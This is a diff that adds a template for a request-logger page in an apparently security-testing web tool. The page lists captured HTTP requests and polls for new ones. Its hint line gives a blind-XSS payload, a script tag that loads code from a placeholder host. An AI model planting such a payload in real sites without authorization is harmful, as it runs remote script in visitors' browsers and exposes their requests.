@@ -1,0 +1,58 @@
+{% extends "base.html" %}
+{% block title %}Logger — {{ entry.token }}{% endblock %}
+{% block head %}
+<style>
+  .req{border:1px solid var(--line);border-radius:12px;margin:10px 0;overflow:hidden}
+  .req .h{display:flex;gap:10px;align-items:center;padding:10px 14px;background:var(--panel);
+    font-size:13px;flex-wrap:wrap}
+  .req .m{font-weight:700;color:var(--accent)}
+  .req .t{color:var(--muted);margin-left:auto;font-variant-numeric:tabular-nums}
+  .req pre{margin:0;padding:12px 14px;font-size:11.5px;overflow-x:auto;white-space:pre-wrap;
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+  .url{background:var(--panel);border:1px solid var(--line);border-radius:9px;padding:11px 13px;
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;word-break:break-all;margin:10px 0}
+</style>
+{% endblock %}
+{% block content %}
+<div class="card pad">
+  <h2>Request Logger{% if entry.label %} · {{ entry.label }}{% endif %}</h2>
+  <p class="hint" style="margin-top:0">Send requests to this URL (replace host with your server's address):</p>
+  <div class="url" id="url">/logger/{{ entry.token }}</div>
+  <p class="hint">Example: <code>curl https://YOUR-HOST/logger/{{ entry.token }}/test?x=1</code> &nbsp;·&nbsp; blind-XSS: <code>&lt;script src=//YOUR-HOST/logger/{{ entry.token }}&gt;&lt;/script&gt;</code></p>
+</div>
+
+<div class="eyebrow">Captured requests (<span id="count">{{ entry.requests|length }}</span>)</div>
+<div id="reqs">
+  {% for r in entry.requests %}
+  <div class="req">
+    <div class="h"><span class="m">{{ r.method }}</span><span>{{ r.path }}{% if r.query %}?{{ r.query }}{% endif %}</span>
+      <span class="t">{{ r.remote }} · {{ r.at }}</span></div>
+    <pre>{% for k,v in r.headers.items() %}{{ k }}: {{ v }}
+{% endfor %}{% if r.body %}
+{{ r.body }}{% endif %}</pre>
+  </div>
+  {% endfor %}
+</div>
+{% endblock %}
+{% block scripts %}
+<script>
+  const token={{ entry.token|tojson }};
+  const full=location.origin+document.getElementById('url').textContent;
+  document.getElementById('url').textContent=full;
+  const esc=s=>s.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+  async function poll(){
+    try{
+      const r=await fetch(`/api/logger/${token}`); if(!r.ok)return;
+      const j=await r.json();
+      document.getElementById('count').textContent=j.requests.length;
+      document.getElementById('reqs').innerHTML=j.requests.map(q=>`
+        <div class="req"><div class="h"><span class="m">${esc(q.method)}</span>
+        <span>${esc(q.path)}${q.query?'?'+esc(q.query):''}</span>
+        <span class="t">${esc(q.remote)} · ${esc(q.at)}</span></div>
+        <pre>${esc(Object.entries(q.headers).map(([k,v])=>k+': '+v).join('\n'))}${q.body?'\n\n'+esc(q.body):''}</pre></div>`).join('');
+    }catch(e){}
+    setTimeout(poll,2500);
+  }
+  poll();
+</script>
+{% endblock %}
